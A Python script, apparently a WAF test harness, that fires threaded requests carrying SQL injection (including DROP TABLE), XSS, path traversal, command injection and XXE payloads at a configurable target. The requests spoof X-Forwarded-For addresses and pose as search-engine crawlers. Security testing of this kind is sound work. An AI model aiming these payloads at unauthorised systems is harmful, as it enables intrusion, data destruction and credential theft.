#!/usr/bin/env python3
import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

from waf_comm import send_message

# -------------------------
# CONFIGURATION
# -------------------------
TARGET_URL = "https://yourtargetdomain.com"  
THREADS = 10
REQUESTS_PER_THREAD = 100
DELAY_BETWEEN_REQUESTS = 0.5  # seconds

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "curl/7.68.0",
    "python-requests/2.27.1",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
]

# -------------------------
# ADVANCED PAYLOADS
# -------------------------
PAYLOADS = [
    # SQL Injection
    "' OR '1'='1 --",
    "1; DROP TABLE users --",
    "' UNION SELECT null, username, password FROM users --",
    "' OR 'a'='a' /*",
    # Encoded SQLi
    quote("' OR '1'='1"),  # URL encoded
    # XSS
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert`XSS`>",
    "%3Cscript%3Ealert('encoded')%3C/script%3E",  # Encoded XSS
    # LFI / Path Traversal
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
    # Command Injection
    "; cat /etc/passwd",
    "| ls -la /",
    "|| ping -c 1 127.0.0.1",
    # RCE
    "`whoami`",
    "$(id)",
    "${7*7}",
    # XXE
    "<?xml version='1.0'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
]

# -------------------------
# HELPER FUNCTIONS
# -------------------------
def random_string(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def build_url():
    path = "/" + random_string(random.randint(5, 15))
    params = {
        random_string(4): random.choice(PAYLOADS) if random.random() < 0.5 else random_string(6)
        for _ in range(random.randint(1, 4))
    }
    query = "&".join([f"{k}={v}" for k, v in params.items()])
    return f"{TARGET_URL}{path}?{query}"

def send_request():
    url = build_url()
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    }
    try:
        r = requests.get(url, headers=headers, timeout=5)
        msg = f"[{r.status_code}] {url} ({headers['User-Agent']})"
        print(msg)
        send_message("waf_bot_test", msg)
    except requests.RequestException as e:
        msg = f"[ERROR] {e}"
        print(msg)
        send_message("waf_bot_test", msg)

def worker():
    for _ in range(REQUESTS_PER_THREAD):
        send_request()
        time.sleep(DELAY_BETWEEN_REQUESTS)

# -------------------------
# MAIN
# -------------------------
if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(worker)
